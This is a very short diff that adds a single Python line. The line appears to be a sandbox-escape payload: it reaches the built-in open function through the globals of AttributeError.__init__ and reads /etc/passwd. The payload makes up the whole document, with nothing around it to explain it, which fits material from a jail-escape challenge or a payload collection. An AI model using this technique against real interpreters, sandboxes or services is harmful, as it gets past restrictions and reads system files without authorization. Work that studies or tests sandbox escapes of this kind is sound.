@@ -1,0 +1,3 @@
+```python
+result = AttributeError.__init__.__globals__['__builtins__']['open']('/etc/passwd').read()
+```
